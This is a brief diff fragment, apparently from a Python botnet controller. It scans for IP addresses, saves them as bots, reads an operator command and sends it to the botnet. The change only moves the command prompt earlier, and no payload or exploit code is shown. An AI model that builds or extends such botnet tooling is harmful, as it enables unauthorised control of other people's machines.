@@ -14,7 +14,7 @@ listip = Scanbot.scan()
 
 Scanbot.display_result(listip)
 
+order = input("Command:")
 RW.saveBot(listip)
 botNet = Command.addClient()
-order = input("Command:")
 Command.botnetCommand(order,botNet)  
